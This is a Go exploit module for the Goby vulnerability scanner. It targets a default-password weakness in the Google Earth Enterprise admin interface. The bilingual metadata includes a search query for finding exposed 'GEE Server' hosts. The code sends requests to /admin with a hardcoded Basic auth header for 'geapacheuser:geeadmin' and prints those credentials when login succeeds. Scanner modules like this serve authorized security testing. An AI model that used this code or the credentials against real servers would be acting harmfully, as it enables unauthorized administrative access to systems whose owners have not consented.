package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Google Earth Enterprise admin Api Dafult Password Vulnerability",
    "Description": "<p>Earth Enterprise is the open source release of Google Earth Enterprise, a geospatial application which provides the ability to build and host custom 3D globes and 2D maps.</p><p>There is a dafult password vulnerability in Google Earth Enterprise.Attacker can use the vulnerability to get administrative authority.</p>",
    "Impact": "<p>Google Earth Enterprise Dafult Password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Google Earth Enterprise",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "谷歌地球企业版 admin 接口默认口令漏洞",
            "Product": "Google Earth Enterprise",
            "Description": "<p>Earth Enterprise 是谷歌地球企业版的开源版本，它是一个地理空间应用程序，能够构建和托管自定义 3D 地球仪和 2D 地图。</p><p>谷歌地球企业版存在默认口令漏洞。攻击者可利用该漏洞登录后台，获得管理员权限。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>Earth Enterprise 是谷歌地球企业版的开源版本，它是一个地理空间应用程序，能够构建和托管自定义 3D 地球仪和 2D 地图。攻击者可利用该漏洞登录后台，获得管理员权限。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Google Earth Enterprise admin Api Dafult Password Vulnerability",
            "Product": "Google Earth Enterprise",
            "Description": "<p>Earth Enterprise is the open source release of Google Earth Enterprise, a geospatial application which provides the ability to build and host custom 3D globes and 2D maps.</p><p>There is a dafult password vulnerability in Google Earth Enterprise.Attacker can use the vulnerability to get administrative authority.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Google Earth Enterprise Dafult Password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title=\"GEE Server\"",
    "GobyQuery": "title=\"GEE Server\"",
    "Author": "AnMing",
    "Homepage": "https://github.com/google/earthenterprise",
    "DisclosureDate": "2022-04-06",
    "References": [
        "https://github.com/google/earthenterprise"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "select",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7099"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/admin"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("Host", u.IP)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Authorization", "Basic Z2VhcGFjaGV1c2VyOmdlZWFkbWlu")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Earth Enterprise Server") && strings.Contains(resp.Utf8Html, "DashboardPanel") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			url := "/admin"
			cfg := httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("Host", expResult.HostInfo.IP)
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			cfg.Header.Store("Upgrade-Insecure-Requests", "1")
			cfg.Header.Store("Authorization", "Basic Z2VhcGFjaGV1c2VyOmdlZWFkbWlu")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Earth Enterprise Server") && strings.Contains(resp.Utf8Html, "DashboardPanel") {
					expResult.Success = true
					expResult.Output = "Success! Plase use \"geapacheuser:geeadmin\" to login!"
				}
			}
			return expResult
		},
	))
}
